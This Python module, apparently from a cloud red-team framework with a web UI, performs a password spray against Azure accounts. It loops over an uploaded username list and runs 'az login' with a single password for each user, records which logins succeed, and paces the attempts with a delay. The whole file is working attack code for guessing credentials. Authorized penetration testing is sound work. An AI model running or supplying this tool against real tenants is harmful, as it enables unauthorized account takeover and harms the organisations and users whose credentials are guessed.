'''
Module Name : Password_Spray
Module Description: Executes a password spray attack using a list of usernames
'''
import subprocess
import json
import base64
import time

def TechniqueMain(password, wait = None, client_id = None, username_file_content = None):
    # input validation
    if password in [None, ""]:
        return False, {"Error" : "Invalid input : Password required"}, None
    if username_file_content in [None, ""]:
        return False, {"Error" : "Provide file containing usernames"}, None

    if client_id in [None, ""]:
        client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # setting the default client to use if user does not specify

    if wait in [None,""]:
        wait = 5 # set default wait to 5 seconds

    # extract usernames from username text file
    content_string = username_file_content[0].split(',')[-1]
    decoded = base64.b64decode(content_string)
    try:
        text = decoded.decode('utf-8')
        user_list = text.split('\n')
        # remove duplicate usernames
        user_list = list(set(user_list))
    except Exception as e:
        # file decoding failed
        return False, {"Error" : e}, None

    # initialize variable to store password spray results
    spray_results = {}

    # start password spray
    for user_name in user_list:
        # attempt authentication
        try:
            if user_name in [None, ""]:
                continue

            raw_response = subprocess.run(["az", "login", "-u", user_name, "-p", password], capture_output=True)
            
            output = raw_response.stdout
            out_error = raw_response.stderr
            
            # checking for failed authentication
            if raw_response.returncode == 0:
                # if auth successful
                struc_output = json.loads(output.decode('utf-8'))
                spray_results[user_name] = {"Success" : struc_output}
            else:
                # if auth failed
                struc_error = out_error.decode('utf-8')
                spray_results[user_name] = {"Failed" : struc_error}
                raise Exception("Auth failed")
        except:
            # wait before attempting next username
            time.sleep(wait)

    # raw response same as pretty response
    raw_response = spray_results
    pretty_response = spray_results
    
    return True, raw_response, pretty_response

def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''

    return [
        {"title" : "Password", "id" : "ps-password-text-input", "type" : "password", "placeholder" : "TheSecretSauce123", "element_type" : "dcc.Input"},
        {"title" : "Wait (Seconds)", "id" : "ps-text-input-username", "type" : "number", "placeholder" : "5", "element_type" : "dcc.Input"},
        {"title" : "App ID (Optional)", "id" : "ps-text-input-client-id", "type" : "text", "placeholder" : "Optional (Default: Microsoft Azure CLI)", "element_type" : "dcc.Input"},
        {"title" : "Username List File", "id" : "ps-username-file-uploader", "type" : "text", "placeholder" : "you got this right?", "element_type" : "dcc.Upload"}
    ]